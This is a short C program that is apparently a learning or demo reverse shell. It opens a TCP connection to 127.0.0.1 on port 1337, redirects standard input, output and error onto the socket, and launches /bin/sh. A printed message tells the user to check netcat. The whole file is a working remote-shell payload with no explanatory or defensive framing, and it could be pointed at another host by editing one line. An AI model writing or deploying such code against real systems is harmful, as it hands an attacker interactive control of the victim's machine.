#include <stdio.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>

void DieWithError(char* msg)
{
		printf("%s\n", msg);
		exit (1);
}

int main()
{
	int client_sockid, status, num_bytes, clientaddr_size;
	
	char buf[1024];
	
	struct sockaddr_in clientaddr;

	client_sockid = socket(PF_INET, SOCK_STREAM, 0);
	if(client_sockid == -1) DieWithError("[-] socket() failed\n");

	printf("[+] Created socket for client with fd %d.\n", client_sockid);

	clientaddr.sin_family = AF_INET;
	clientaddr.sin_port = htons(1337);
	clientaddr.sin_addr.s_addr = inet_addr("127.0.0.1");

	status = connect(client_sockid, (struct sockaddr*)&clientaddr, sizeof(clientaddr));
    if(status == -1) DieWithError("[-] connect() failed\n");
    
    printf("[+] Spawning a shell, check netcat.\n");
    
	dup2(client_sockid, 0);
	dup2(client_sockid, 1);
	dup2(client_sockid, 2);

	execve("/bin/sh",NULL, NULL); 
    
	status  = close(client_sockid);
	if(status == -1) DieWithError("[-] close() failed.\n");
	
	printf("[+] Closed connection successfully.\n");
	
	return 0;
}
